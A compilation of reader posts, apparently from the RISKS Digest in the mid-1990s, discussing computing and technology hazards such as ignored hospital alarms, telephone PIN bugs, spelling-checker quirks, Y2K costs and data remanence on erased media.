problems - usable enough that I remained in denial about the need to take
time to investigate further.  The problems were initially rare, and became
more and more frequent over time.  It was easy at first to put the problem
down to software (though the lack of repeatability should have been a clue).
Finally, the situation became severe enough that I opened the box and
immediately found the burnt out fan.  I am guessing that the fan became
clogged with dust and gradually got less effective before dying altogether.
This would explain the slow worsening of symptoms.
<P>
The point is that the machine never gave any diagnostic, and never failed in
any repeatable or well-defined way.  It just gradually became less and less
deterministic in its operation.  The risks of this are obvious, I think.

<P>
I recently lost my AT&amp;T phone credit card, so I applied to them for a
replacement.  I was informed that they would have to change the PIN
(four-digit access code appended to my phone number on the card) and would
issue me a new one. I received the new card, with the new PIN, about a week
ago, and tried to use it today.  It kept rejecting the number as invalid.
<P>
I called AT&amp;T, and because I was near the phone I use for billing, the help
desk assistant was able to confirm that it was me.  She tried my card and
my new PIN, and it didn't work.  She then gave me the PIN that worked--my
old one, which was supposedly replaced. She was in a very talkative mood,
and explained that this happened to her quite often.  If a PIN is changed,
in her experience, she had to wait at least a day before putting in the new
PIN, or it wouldn't take. I can think of a number of reasons for this
little bug, since their database is huge and distributed.  But that's not
the point here...
<P>
The help desk person said she has had this problem for at least six months,
and even though she has complained up the line, the waiting bug persists.
This waiting period also isn't documented, so inexperienced personnel tend
to make the mistake over and over, leading to many calls to her desk.
<P>
I'm not familiar enough with AT&amp;T software methods to comment extensively
on the whys and hows of their coding policies, but it would seem to me that
their attitude to this (minor) bug is disturbing. The bug is obviously a
serious problem to customers, and is also easily fixed in a distributed
database environment.  At the very least, a lockout would prevent new codes
from being entered for 24 hours.  If their approach to this bug is in any
way indicative of their general policies, then I really wonder about the
stability of the rest of their code, and I see some of the well-publicized
phone outages "due to software bugs" in a new light.

John Strohm's article about the risks of ignoring medical alarms in
<A HREF="/Risks/17.49.html">RISKS-17.49</A> struck a nerve.
<P>
We had a similar experience.  Our newborn had to spend a few days in
the Newborn Intensive Care Unit (NICU).
<P>
All patients (babies) in the NICU are wired up with four sensors: heart
rate, breath rate, temperature, and blood O2 level.  The heart rate and
breath rate sensors were particularly unreliable, intermittently getting
good data and noisy data and no data.
<P>
The data monitors were configured to sound an alarm and flash the display
when any of the sensors was reading data out-of-range.  So far so good: an
alarm indicates potential trouble.
<P>
Problem is, the data from the sensors was so unreliable that the monitors'
alarms were always going off.  In fact, the entire 20-bed NICU was always
noisy with various alarms (patient monitors, IV pumps, etc.) going off.
<P>
What troubled me most was the NICU staff's response to the monitor and
IV pump alarms:  ignore them!  When the staff's rounds brought them to
the patient then they would press the "alarm-silence" button.
<P>
No one at the NICU had a good answer for me when I asked "why have audible
alarms if you always ignore them?"
<P>
The risk here is that a real life-threatening situation would
not be discovered in time to help the patient.  The usual
caveats about over-reliance on technology also apply.

<P>
John R Strohm's account of problems with morphine-delivery pumps in
hospitals shows the problems associated with alarms. But there's an
underlying issue.
<P>
My mother-in-law was recently hospitalised with what turned out to be severe
dehydration. She was put on an active (pumped) drip system. When we were
visiting, a young doctor made some adjustments to the controls, then left
the room. I noticed that the flow rate was now showing zero. When I queried
this with a nurse, we were told that "the doctor has adjusted the rate". We
pointed out that a dehydrated patient presumably should be getting some
fluid intake, but to no effect. After about five minutes, another doctor
passed by. When we spoke to him, he agreed with us and pressed the "start"
button on the pump.
<P>
Part of health service culture is that young doctors often make mistakes,
and experienced nurses can often fix their mistakes informally. I have seen
this happen when I've been a patient. But not in this case. I suspect the
difference is that this case concerned technology. I don't think the nurse
was very sure what the displays and the controls meant. Is this just a
question of training?
<P>
I'm reminded of studies which show that women are more intimidated by
digital technology than men. Not because of intelligence or ability, but
because some technologies are socially defined as 'male' - video recorders
and TV remotes being good examples, as well as computers.  In the hospital
context, I suspect technology is perceived as something *other* than normal
nursing care. It is owned by someone else. The other possible explanation is
that nurses are reluctant to question the authority of doctors, even if (to
a lay observer) the doctor has clearly made a mistake. Neither explanation
is very comforting.

<P>
You are right on the semantics of "High-Tech" crime. The difference between
the food flavoring and RAM chips is that once stolen RAM chips are easy to
transport (how many K$ worth do you think fits into a suitcase ?) and they
are easy to sell because there is a large number of costumers for them.
There are even shops these days that sell "Grey Market" RAM chips, that is
chips that have uncertain origins. While most of these are legitimate, it
can be very difficult to assert the legitimacy of chips that are being
offered.
<P>
The term "High-Tech" comes from the Police Departments. Austin, Texas has
such a division that deals with everything from stolen RAM chips over
software piracy to hacker break-ins. It takes an investment of resources to
train police officers in the area of computers (this includes such mundane
issues as the current price of hardware) and it is a trade-off which crimes
to pursue. From a meeting with member of our local High Tech Crime Unit I
attended, it was clear that they would focus on the cases that had public
exposure. That is an armed robbery for chips or hard drives would get
serious attention, small scale piracy would not. They would spend time on
the internet looking for what looked like thieves trying to unload stolen
goods.
<P>
As for the "True High Tech" crimes such as intrusion they did tells us that
they would help the companies who had been victimized by investigating the
crime, but would not give us too many details. It was pretty clear that the
officers were not computer experts, but rather police officers exploring
new grounds.
<P>
The disturbing thing was that the local police officers could not get any
help from the FBI, apparently the FBI does not have a "High-Tech" crime unit
or at least not one that will cooperate with local authorities. The only
cooperation the local police could get was from similar units in other "High
Tech" cities like San Jose and Portland. Given the non-local nature of
"net-crime" this is disturbing.

&gt; So, I ask, those of you theorizing so confidently about code which<BR>

<P>
In my experience (with Unisys A Series systems), programs (both vendor
supplied and user written) make heavy use of error recovery facilities.
If this stuff breaks, we would know about it right away.  There are also
test suites for the OS error recovery facilities.
<P>
Of course, these systems handle errors and error recovery differently
from most.  That's one of the reasons they are so much fun to use.
<P>
As best I could make out, David was talking about stack overflow
conditions.  On the A Series, as long as there is an error handler
statement at a safe place (that is, not at the top of an already
overflowed stack), if a stack overflow happens, the stack is cut back,
and control passes to the error handling statement.  (The program can
get a hidden stack overflow, but the OS will just stretch the stack for
it.  Only if the stack can't be stretched will an actual stack overflow
condition exist.)

&gt; Security, in the broad sense, is a joint responsibility of the<BR>

<P>
The A Series systems can best be thought of as object-oriented at the
hardware level.  Tasks (threads, stacks, processes), files, arrays, etc.
are all objects.  The compilers won't let you perform an improper action
on an object.  At a lower level, the hardware ensures that the operator
and the operand match.  (Can't do a normal store onto a pointer, for
example).  Programs can't access memory per se.  They can only access
objects (scalers, arrays, files, tasks, etc.)   A lot of the bugs people
fight with on other systems just aren't an issue.

Many of the examples cited aren't more expensive on the A Series, for

block is exited, the hardware calls the OS to deallocate the objects.

Most A Series system software in fact comes in two flavors: regular and

Peter Neumann's story about the Word spelling checker glitches brought back
memories of Microsoft's sales presentation for the (then new) Office 4.2 to
the chemical company that I interned at last summer.
<P>
Imagine over two hundred employees packed into an auditorium, with a
Microsoft employee at the front excitedly running through his
"gee-whiz-bang" software presentation of the virtues of the new Microsoft
Office.
<P>
The salesman started to demonstrate the "Autocorrect" feature in Word, which
automatically fixes the most common typos as soon as users make them.  It
also includes a feature allowing users to add their most common typos to the
list.
<P>
To demonstrate this, the presenter deliberately misspelled a word.  As I
recall, he mistyped "Personal Memo" as "Porsenal Memo".
<P>
The computer naturally flagged it as a typo.  Good so far.  To show Word
easily fixes such common typos, the salesman activated the "Autocorrect"
function to fix it.
<P>
Unfortunately, he entered "Personall" as the automatic correction that Word
should now use for "Personal"!  OOPS.  Wrong spelling.  But no problem.
Word gladly accepted it anyway.
<P>
He then proceeded to unintentionally demonstrate how Word can now
automatically add typos to all of his "Personall Memos".
<P>
After he concluded this segment of the presentation by proclaiming the
brilliance of the programmer's designers and asking us, "What do you
think...is Office a work of magic?", I nearly fell over laughing in my
chair.
<P>
In short, Microsoft's design implicitly assumed that users would be able to
spell words correctly in order to use their spell checker.  I suspect that
this may have been a questionable assumption.  But a damned funny sales
presentation. ;)

The classic example (IMHO) is FrameMaker ... which flags the word
"Interleaf" and recommends you change it to "FrameMaker".

Allow me to point out that the Word spellchecker is actually a third-party
plug-in, which Microsoft buys from a well-known publisher of digital
reference materials. As with any good dictionary, the Word spellcheck module
does not incorporate words until they can be considered by the editors to
have become a part of the language. When Microsoft purchased this product,
probably in late 1993, most of these words were not part of the language or
did not have the currency they do today.
<P>
The Risks of such language databases are already well-mitigated, in my
opinion, by the capacity of Word and similar programs to add words to the
spellcheck database. They could be mitigated further by Microsoft offering
updates to the dictionary, perhaps for download on its website, but with the
feature of user customization, who would bother to do this? Would you?
<P>
I'm not a Microsoft apologist, but this is less a Risk than a potshot at a
popular target.

<P>
The Sunday, 3 December 1995 issue of the Detroit News included an article
discussing the projected costs of fixing current programs to correctly
handle dates in the year 2000.
<P>
This discussion has appeared many times in RISKS, but the article
provides some interesting numbers (both actual and projected).
<P>
Consumers Power Co. (a Michigan-based electrical utility) began the
conversion process two years ago and estimates it will take $20-45M (US) to
convert their 350 computer systems.  A spokesman for Consumers Power says
that the problem for them is quite serious; if not fixed, it could lead to
denial of service for its customers.  Blue Cross (a health-care provider),
which processes 100 million medical claims per year, has budgeted $3M for
this year alone to begin converting its systems.
<P>
The article gives a few other estimates, claiming that the average Fortune
500 company will spend $100M to convert their own systems.  Worldwide, the<BR>
cost is estimated at $300-600M.
<P>
Bill Schoen, a computer programmer from Ford who (the article states) was
the first to write about the 2000 problem in 1983, says he contacted every
Fortune 500 company about the problem at that time, but few were interested.
"The people that were in positions of power then were going to be retired
long before this problem kicked in.  They didn't care about a mess they
weren't going to be around to clean up."

[From Cable Regulation Digest]
<P>
More powerful than a defective Pentium chip, it's the Intel CD-ROM!  Intel
developed a press kit that really has impact on reporters -- it cripples
their computers. In touting their cable modems at the Western Show, Intel
execs distributed a press kit with a CD-ROM demo of some of their modem
products. Unfortunately, cranking it up will change those pesky
configuration specs on your hard drive, leaving you unable to run other
programs. Staffers hurriedly posted signs in the press room warning that the
CD "will seriously damage your computer system. Please discard immediately."

While it's well known that deleting a file from a disk doesn't really remove
the contents, I'm not sure if even a disk erasure program will get rid of
the file.
<P>
I remember a few years after the Nixon tapes and infamous erasure of some
chunk of the tape (20 minutes?).  I was talking to somebody working at a
research lab who said that according to their magnetic recording expert the
contents could have been recovered even if they were simply erased -- enough
signal would remain if you really wanted to get the information back.
<P>
The best advice if you're giving a computer disk to somebody else is to use
a new disk and don't use any sort of copy software which might get the
unused portion of the last sector of a file.

Although I knew there was a lot of fairy dust in Silicon Valley, I didn't

Spelling deviations have always been funny. The little column-end snippets
in The New Yorker are often based on spelling deviations, and have been
since long before computers were involved. An old favorite of mine
substituted Datsun for dachshund.
<P>
The exact nature of the errors has changed, since computers check spelling
differently from the human mind. The old deviations, like the example above,
were often based on phonetic similarity whereas the new deviations are
related to digital manipulation of the letters. But aren't we just
continuing our fascination with spelling rather than discussing any risk of
computer use?
<P>
Our society is obsessed with "correct" spelling. This obsession didn't exist
400 years ago. If an writer changed a spelling, well, that was a new usage.
I've heard it claimed that Shakespeare spelled his own name more different
ways than anyone else in history.
<P>
I pick up spelling easily. This is a blessing and a curse.
<P>
In the current environment, where "correct" spelling is considered
important, I can produce a document with no spelling deviations beyond an
occasional typo. But when I read a document that is well written but marred
by significant deviations from standard spelling, my mind is drawn to the
spelling to the detriment of my ability to absorb the content. At such
times, I often wish that I and others had a more accepting attitude toward
spelling deviations.
<P>
Perhaps the risk is that computers have given us another basketful of
examples to feed an unhealthy fascination with spelling.

Jeffrey Sherman (<A HREF="/Risks/17.49.html">RISKS-17.49</A>) mentioned quirks of WordPerfect 6.1 being too
clever. Here's something we found a few weeks ago:
<P>
A colleague was trying to prepare a table for publication, listing locations
of particular parts of a gene in a long sequence.  He would type something
like '179-285' into the table boxes, only to find when he tabbed along to
the next box, that WP would replace it with -106.  He couldn't find any way
to persuade WordPerfect to stop treating the table box as a spreadsheet
entry, and being in a hurry to get the paper completed, wound up typing
these entries in the form '179 to 285', which finally persuaded WP to leave
them alone.

The posting on "NCSA FireWallCon '96" in RISKS v17 n42 unintentionally
illustrates another (in)famous risk: ambiguous abbreviations.
<P>
When reading this item, I, and I suspect many others, assumed that "NCSA"
referred to the US National Center for Supercomputing Applications,
well-known for (among many other things) such widely-used software as NCSA
Telnet for PCs and more recently NCSA Mosaic.  Since NCSA have been a major
internet site for some years, their sponsoring a firewalls convention seemed
quite plausible.  I thought the various *.ncsa.com internet addresses given
were a bit odd, since NCSA always used to have *.ncsa.uiuc.edu addresses,
but I didn't pay too much attention to this.
<P>
It was only when reading the _last_line_ (the poster's signature, which
in fact our moderator usually trims) of the RISKS item that I discovered
that "NCSA" actually referred to the (presumably US) National Computer
Security Association!
<P>
The lessons to be learned?  Well, there are about 450K possible 4-letter
sequences, but a simple "birthday paradox" calculation shows there's a 50%
chance of duplication if we randomly choose 800 (!) of them.  (The nonrandom
letter-frequency distribution of real-world abbreviations just makes things
worse.)  So this sort of "name abbreviation ambiguity" is going to happen
more and more often.  About all we can do is to spell out key abbreviations
in the lead paragraphs of our postings.

&gt; ... because some technologies are socially defined as 'male' ...
<P>
Fortunately for the RISKS community, my partner has discovered the real
reason for people being intimidated by technology. She has observed that,
despite the fact that I am a computer professional, I seem to be totally
intimidated by digital technology in certain contexts. Specifically, I am
totally unable to recall which programs to use for different types of
clothes when putting a load of washing into the automatic washing machine.
<P>
She has thought long and hard about this and has concluded that the
difference is that most kitchen equipment comes in nice attractive light
colours whereas technologies that are socially defined as 'male' often
come in dark coloured or black boxes.
<P>
She has concluded that the simplest solution to enable me to do a load
of washing on my own is to paint the washing machine black.
<P>
Unfortunately, the correlation is not perfect. For example, I can never
remember how to programme the (black) video recorder to record a TV show

A more in-depth study is needed. If the European Union could provide me

<P>
I read with interest the accounts of alarm silencing within the medical
environment.  In my position as a clinical engineer, I have spent many hours
evaluating medical equipment for purchase and have seen the same issues wrt
*all* medical equipment.
<P>
Specifically with infusion pumps - most do have some type of indication that
they are being operated on battery - sometimes it's a positive indication (a
battery icon lit up on the front panel) and sometimes it's a negative
indication (an AC plug lit up on the front panel).  Most pumps do have an
alarm to indicate that the battery is being depleted - usually a two stage
alarm - one which alarms half an hour before the battery depletes and then
one which alarms right before the battery depletes and the equipment powers
off (if it is not plugged in immediately).  There are also some battery
management menu items in later model pumps.  Lastly, most personnel are
trained in the use of the equipment - in fact because of some voluntary
regulatory requirements (Joint Commission on Accreditation of Hospitals -
JCAHO for short), hospitals are required to document that training has
occurred *and* prove proficiency in the use of the equipment they need to
use in the discharging of their duties.
<P>
Even with the above, occurrences like those described in the posts happen.
There are several things going on - first, in an ICU, a nurse is *bombarded*
with many different pieces of equipment, which for the most part have
slightly different operating/user interfaces and different purposes.
Mistakes are bound to happen.  Second, if a hospital has not standardized on
one manufacturer for a certain type of device, the user has yet another
interface/another combination to worry about - it's kind of like going
between MS-DOS, UNIX, Windows, Macintosh, etc - little things can make a big
difference (this is a big issue for me as I investigated medical device
incidents in the hospital - not to mention materials management wanting to
save money by standardizing on one manufacturer).
<P>
I know that in my current position, I'm trying to reduce the number of
interfaces that clinicians are dealing with - we routinely tell medical
manufacturers that we want fewer/smaller devices that have a single
interface - as well as integration between devices for better information
display - i.e. in one place.  I know that the future of medical devices will
eventually be some sort of transduction mechanism hooked to a PC or some
computer which does data gathering, processing and dissemination.  Until
then, we will have to deal with the onesies and twosies and incongruent mix
of technologies and concentrate on training, training and training along
with striving for standardization and reduction of different interfaces for
clinicians.
<P>
Lastly, what I find interesting is that we used to tell the clinicians that
the technology was not there to replace them - i.e., *look* at your patient
- the technology was merely there to assist them by giving them more<BR>
information.  Sometimes if the clinicians are pressed for time, they lose
that perspective - and yes, sometimes they are intimidated by the
technology.  I'd venture to say that producing medical devices is probably
one of the more demanding pursuits because of the regulatory jungle, the
nature of the business (saving lives) and the broad range of technical
skills of clinicians.

<P>
It is interesting to read the recent stories about the risks in silencing
alarms. The problem is well known in the process industry, but on a much
larger scale. Instead of having a single or a few alarms, there are hundreds
or thousands. A nuclear power plant can easily have several thousand alarms,
and one of the Norwegian off-shore installations is known to have about
15.000 alarms that go into the control room.
<P>
The reason for this proliferation is the use of information technology. In
the "old" days, alarms had to be announced via an annunciator tile, and
there was a limit to how many annunciator tiles one could put in a panel or
on a wall. Not so with computers. Alarms can be produced simply by writing
them to a screen, and the capacity of the screen is unlimited. That is,
assuming that the operators are able to scroll through all the alarms and
find the important ones.
<P>
This has led to the art of alarm filtering, which uses often complicated
logic to supress alarms that are not relevant at the moment. Note the use of
the term RELEVANT. This is where the problem lies, because it requires that
all conceivable situations - or at least all the important ones - can be
analysed in advance. Quite apart from the problem of software reliability
(of the filtering algorithms) this touches upon the problems of risk
analysis and interface design.
<P>
To return to alarm silencing, this is clearly a problem in control rooms as
well as in hospitals. It is a problem for the doctors as well as the
patients. When alarms occur frequently, as during an accident, various types
of visual and auditory signals are used to attract the attention of
operators. But in the medium and long term these signals are seen as
distracting (which they are) and useless (which they should not be) and are
hence ignored. This is a simple fact of human nature that designers should
acknowledge. The risks in designing alarm systems without considering the
users' ability to respond appropriately are clearly substantial. it is a
problem that is taken very seriously in the industries. But specific
spectacular examples of ignoring alarms are welcome.
<P>
One that comes to mind is the pilot's comment in the Lauda Air crash in
1991. According to the transcript from the CVR, the pilot said: "But, ah,
you know it's a - it doesn't really, it's just an advisory thing, I don't ah
-". This was in response to the cockpit warning light. Six minutes later the
plane had crashed.

Cliff Sojourner's article (<A HREF="/Risks/17.50.html">RISKS-17.50</A>, in response to John Strohm's
article) struck a nerve with me too.  All the medical monitors are great
technology but apparently the tolerances are set for far too many false
alarms to be safe in the real world.  I suppose that each manufacturer wants
to be sure it isn't their equipment that fails to give a warning early
enough - that way a failure can be blamed on the person watching the
monitor, but the end result is that real problems go unnoticed for long
periods.
<P>
Last spring my two-month-old nephew was on a morphine IV pump after surgery,
along with all the various monitors and alarms Cliff mentioned.  The heart
rate monitor repeatedly alarmed and the nurses would come in and silence it,
telling us it was normal.  Unfortunately, the monitor didn't have another
alarm that said there was a real problem.  It turns out my nephew was
getting a morphine overdose and his heart rate really was getting
dangerously low.  This was only discovered after persistent nagging on the
part of the mother and grandmother who were there the whole night and
watched the monitor themselves.  Finally they got someone to pay enough
attention and he was transferred to ICU and antidote was administered.  It
was touch and go the next twelve hours or so, but he's fine now.  But I
wonder what we would have been told the cause of death was had there been no
family member there and awake.
<P>
As Cliff wrote:
&gt; The risk here is that a real life-threatening situation would<BR>
&gt; not be discovered in time to help the patient.  ...
<P>
In this case the situation was discovered in time, but without much margin.

On 30 Nov 1995 <A HREF="mailto:SOJOURNER_CLIFF@tandem.com">SOJOURNER_CLIFF@tandem.com</A> wrote about visual and audible
alarms used in an Newborn Intensive Care Unit, and how false alarms are
common, and how they are regularly silenced via a cut-off switch:
<P>
The initial problem of ignored alarms is of course quite troublesome, but I
wonder about a simpler but more insidious risk: are alarming noises
_harming_ the patients, simply by their existence? Certainly, they aren't<BR>
going to be bone-shaking klaxons, but if someone desperately needs rest, or
if their sensory nerves aren't yet fully formed, can we truly say that this
is a good environment for them to be in?
<P>
I feel safe in saying the current risk is minimal, and perhaps nonexistent,
but that isn't a reason to ignore the issue. The science of user-interfaces
is still in development, and we mustn't forget that a user is anybody in the
room, be they human or animal, asleep or awake, participants or not.
Learning when to avoid using a particular type of user-interface element
(like an audible alarm) is just as important as learning which elements
should be used in the first place.
<P>
Here, some obvious solutions present themselves: visible alarms (like
rotating police-car style lights) that are highly visible, but shaded so
they are only visible to people standing up. Such a light would be obvious
the instant you enter the room, but not disturb the patients. (A minor risk
here is that of creating problems for short, or wheelchair using, staff
members.)
<P>
In a different (and unfortunately much more RISKy vain) one could use an
entirely different precept of how alarms should be handled, and give staff
electronic devices (pagers, etc.) that will be activated by a central
computer on any alarm condition in their vicinity or area of interest.
<P>
Both lose the value (immediacy, direction, and information content) of an
audible alarm, but avoid the problem of alarming the folks who don't need to
be alarmed in the first place.

Unreliable warning systems have been problematic for centuries (hence the tale
of the boy who cried wolf). We quickly learn to ignore them so we can continue
with real work. However, the danger is that we get used to expecting them to be
unreliable.
<P>
While in high school I once borrowed a neighbor's family car. They told me,
"Oh, by the way, you can ignore that oil light, it's been on for ages." You
can guess what comes next. In the middle of the night as I am returning
home, the thing throws a rod, leaving a trail of engine parts on the road.
An indicator of imminent failure alerted them to a well-known maintenance
issue, yet they completely ignored it.
<P>
The risk is the age old one of complacency. People get used to complex
technological devices being flaky. When yet another device seems to be
acting up, they don't take it seriously, even when someone's life depends on
its proper operation. As an engineer, I find this behavior totally
incomprehensible, but it is something I have to expect from users.
Unfortunately, I can only go so far in preventing a user from doing
something stupid. Worse, I can never fully anticipate the ways in which the
system can be abused and misused. This seems to be more a problem of
psychology than technology. There is no bug for me to fix if a user chooses
to ignore an alarm condition and insists on continuing to run.
<P>
This problem is compounded by uncoordinated and unprioritized alarms. The
multiple systems monitoring a patient are all clamoring for attention as the
one thing that needs attending to. In reality only some of them may really
be pertinent, while others can be safely ignored for the moment. Imagine
working in an environment where a half dozen little crises seem to be
erupting every moment, despite the fact that everything is under control. It
makes it hard to tell when things go out of control.

The issue of alarms and alarm suppression in a hospital environment is
a rather complex one.  From time to time IEEE EMB (the bio-med
engineering magazine) discusses the problems involved.  There is a
fundamental conflict in many hospital settings:
<OL>
<LI> There are a great many machines and sensors providing crucial
information, life-critical services, etc. in place.  Each of them is
designed with visible and audible warning and danger indicators of
various sorts.
<LI>The medical staff sometimes go into sensory overload with all the
noises.  This has led to dangerous situations.
</OL>
This is a valuable area to study and pursue mechanisms for improvement.
Don't expect any simplistic answer to work.  For every situation where it is
obvious that a warning indicator would have saved a life, there is another
situation where that same indicator would cost a life.  Often you must place
this life-critical decision in the hands of the medical staff at the time.

<P>
It appears that the medical equipment industry is traversing the same ground
with regards to audible alarms as the military and space industries crossed
decades ago.
<P>
In both the space and military applications, it has long been known that too
high a false alarm rate will cause human operators to either ignore alarms
from that system, or shut them off.  In neither industry was this considered
a "good" thing, so most RFP's would specify the maximum false alarm rate
allowable for a system.  In some systems, this meant that some valid alarm
situations might go unannounced for a time, but the system designs usually
required that a real alarm situation would be identified within a specified
time.  These two (and, of course there were others) requirements led to both
hardware and software designs that attempt to filter out transient noise and
that also track suspect records over time to identify alarms in both noisy
and lossy environments.
<P>
In most instances, both hardware and software designs are modified to
provide the most capability in handling these problems.
<P>
In the case of some satellite communications, data frames could be marked at
transmitting end as to whether all the data in the various fields (i.e. from
the various instruments) was the latest and most likely reliable, or old (no
new info from last frame) and suspect.  On the receiving end, the entire
frame could be marked as to whether the broadcast was received complete,
partially or not at all.  This still presented too much alarm data, and so
the data is passed to diagnostic software that tracks states from frame to
frame, accumulating historical information and watching for thresholds and
other types of trend information to generate alarms at consoles for human
monitoring.  Of course, if done improperly, the system can miss alarms, but
the groups writing this software are supposed to thoroughly test it, and run
both filtered and non-filtered versions in simulation and early operations
to verify the software (along with all the other software verification
processes).
<P>
If the medical industry looked around at other safety critical industries
that had trod this path before, some of these risks from too frequent alarms
could be quickly reduced or eliminated.
<P>
But, I guess this is the case of the risk of those ignorant of history are
doomed to repeat it :-/

The Dartmouth Time Sharing System was an operating system and suite of
application software developed and maintained primarily by students in the
early 1970's.  One year the maintainer of the BASIC compiler introduced a
special "feature": In celebration of the Ides of March, on March 15th it
would print the numbers appearing in messages as Roman Numerals.  The
college got a good laugh out of it at the time.  The year after this person
graduated and moved on, Dartmouth sold the system commercially to a handful
of sites.  In January of that year, in a routine test, the new owner of
Basic discovered that while the Roman Numeral code had been removed from the
distributed version, the special check for March 15th that activated it had
not been, with the result that on March 15th, BASIC would surely fail when
it attempted to print a number.  The fix was quickly determined and
bulletins distributed to the other installations with special instructions
that it was vital to install it before March 15th.  In spite of several
warnings, however, some or all of the installations outside of the college
experienced a BASIC compiler failure on March 15th because they had not
installed the fix.  Morals to be drawn include:
<UL>
<LI>Be very careful of temporary hacks.  They have a habit of outliving
carefully implemented programs.
<P>
<LI>Never count on your ability to get someone to install an update to
prevent a disaster.

British Columbia has implemented a province-wide database called PharmaNet;
the main objective is to reduce the number of fraudulent or duplicate
prescriptions by having all pharmacies networked together. Another objective
is to reduce the incidence of drug interactions, and this is where the
system *may* fall down.
<P>
I recently purchased a bottle of cough syrup with codeine; in B.C. this is
not a prescription item, but is rather an over-the-counter (OTC) item that
you must request from the pharmacist. I noticed that, while prescriptions
were entered into the database, the cough syrup was not. The pharmacist
confirmed for me that they were not required to enter items like this into
the database.
<P>
I'm no pharmacist, but I would imagine that there are prescription drugs
that can interact adversely with codeine or other OTC drugs that pharmacies
dispense.
<P>
I plan on writing the Ministry of Health about this, but this loophole shows
that it's in the patient's best interest to ask questions to make sure
anything they take is safe, and won't interact adversely with something
else.

Excel 7 has a new feature where if you are entering data in columns and
what you have typed so far matches an entry earlier in the column, then
that full entry is placed in the cell you are entering until you press a
key that is different from the previous entry.
<P>
For example, Say I have a stock list with
<P>
BOLT 25mmx.6mm    $4.00<BR>
BOLT 25mmx.8mm    $4.50<BR>
BOLT              $2.50
<P>
When I come to entering BOLT the second time, Excel prompts with the
measurement information and if it is the same, I can just hit enter to
accept it or I can type over it to replace it. If I'm not looking at the
screen as I type it it doesn't matter as my typing replaces the selection.
HOWEVER when I come to entering the third item here, which in this case has
no further information following it, Excel enters the measurement
information anyway and as I hit enter it is accepted. If I am working from a
paper list somewhere and entering lots of information very quickly - not
looking at the screen very often, then I can enter totally incorrect data.
My example is not a fantastic one, but I have NOTICED that I have been
stuffed up several times already by this cute little feature. How many times
have I not noticed that the information is incorrect?  I think that this
little feature will cause a lot of heartache around the world as some data
becomes entered incorrectly.

The article about the Intel CD-ROM reminded me of a similar case I
encountered only a few weeks ago.  My son purchased a CD-ROM with software
for a game on it.  The minimalist instructions said merely to "Insert the CD
in your computer, cd to the drive your CD is on, and type 'install'."  (I
note that you are expected to realize that the lower-case "cd" means
change-directory, while the upper-case "CD" means compact-disc.  I wonder
how many neophytes get confused by these.)
<P>
It didn't work.  It appears that the packaging strategy that was employed
was to copy three things to the CD: a compressed archive about 15MB big, a
program that could uncompress archives of that type, and a 3-4 line install
script that would invoke the uncompress program to uncompress it out to
whatever directory on your hard disk you specified.
<P>
Other than the obvious stupidity inherent in having a 15 MB compressed
archive as the only file on a CD-ROM capable of holding 600 MB, rather than
just putting 30 MB of uncompressed files on the CD, the problem was that the
uncompression program they used worked by creating a temporary file in the
same directory as the archive file: it is therefore incapable of
uncompressing a file on a Read-Only file system like a CD where it isn't
allowed to create files.
<P>
In order to install the software, I had to figure out that that the above
situation was in fact the problem (not easy based on the error message I was
given, which read merely "archive file corrupt", when in fact it was fine),
copy the archive file to my hard disk, then uncompress it there.  This also
meant that I needed a lot more disk space free than they claimed in the
"requirements" on the box.
<P>
The RISK Lesson?  Don't assume that the installation program you tested when
you ran it in your development environment (from a Read-Write Hard Disk) is
going to work when used in the actual installation environment unless you
test it in exactly that environment.

EPSQ.  The current version is 1.2.
<P>
&gt;You obviously don't sign the form (no digital signature capability); at<BR>

&gt; clearances could be so unaware of the risks as to allow it.<BR>
....yadda, yadda, yadda.
<P>
The data is encrypted by the EPSQ program as it creates the disk file.
The program uses FUNCky a product of dLESKO, Inc of Jersey City, NJ.
Before the encrypted file is transmitted, it's zipped using PKWARE and
the program requires the user to use PKZIP's encryption feature.
FUNCky has not been evaluated to meet FIPS 140-1 requirements for
cryptographic modules and the DIS recognizes it is not equal to DES.
Most security-aware professionals know of the plethora of PKZip
crackers available.
So Name Withheld's data was double encrypted before being sent
over the net, and it's stored in a file that can't easily be read. This begs
the question of how much security is necessary to protect Name
Withheld's data?  After all, we're not talking launch codes here.  DIS
recognizes the need to use FIPS 140-1 compliant encryption and is
moving in that direction.  In the mean time they've put something in the
hands of security managers in the field that provides adequate
safeguards considering the value of the data and the risks associated
with it's compromise.
Version 2.0 of the EPSQ will have more robust encryption.  Among the
products under consideration are RSA's BE SAFE and AT&amp;T's SURITY.

Recent posts about spelling checker oddities spur me to mention the grammar
checker included in Microsoft Word for several years now.  The RISKS-related
issues are software bloat, creeping featuritis, and software problems that
escape notice for a long time because apparently nobody ever really uses the
software.  I've had several conversations with colleagues about this.  I
assert that "obviously nobody at all uses the grammar checker because nobody
seems to be aware that it doesn't work."  I usually get a bored response.
But whenever I succeed in actually getting someone to run the thing on one
of their own compositions, I get a stream of amazed comments along the lines
of "Huh?"  "Gosh!"  "This is _unbelievable_!"  "Why on earth did it say
_that_?"  "Why is it complaining about the passive voice?  This sentence<BR>
isn't in the passive voice." "What in the world _is_ it doing?"
<P>
For example, presented with the sentence
<P>
"Part of health service culture is that young doctors often make mistakes,
and experienced nurses can often fix their mistakes informally."
<P>
the grammar checker in Microsoft Word for the Mac version 5.1 responds:
<P>
Consider "those" instead of "that." OR Consider "doctor" instead of
"doctors."
<P>
When presented with:
<P>
"The other possible explanation is that nurses are reluctant to question
the authority of doctors, even if (to a lay observer) the doctor has
clearly made a mistake."
<P>
it responds:
<P>
"This appears to be a run-on sentence."
<P>
The problems with the grammar checker are not subtle.  I beg and plead with
anyone tempted to reply in its defense that they try it out, on a piece of
real text, before replying.  I truly believe that this is a piece of
software that cannot possibly be of use to anyone: not to students, not to
people who are not native English speakers.  It exists only because it makes
a good demo and looks good on a bullet-list chart.

Steve_Kilbane described a situation in which a security locker might remain

console.
<P>
It's not too hard to foresee a race condition where someone pays
to lock your luggage in, and then walks off with the unlocking code.
<P>
Of course, a cost-conscious thief will do it the other way: open and close a
locker door, then let you walk up and pay for her locker and then stroll
over to take your belongings.  Let's see... saving five shillings per theft,
ten strikes a day, times time and a half for overtime...

This ability did exist at the time, and the tape was examined by experts in
the field.  It turned out that the tape segment in question had been erased
*repeatedly*, perhaps a dozen times, enough to wipe out any pre-existing
information.  This evidence established beyond doubt that the erasure was
not accidental.
<P>
I understand there are erasure security standards for magnetic media which
specify that the disk or tape be overwritten a certain number of times
(six?) to ensure that the former contents be unrecoverable.

No question, though, that it's preferable to distribute information on
disks which never held any sensitive data.

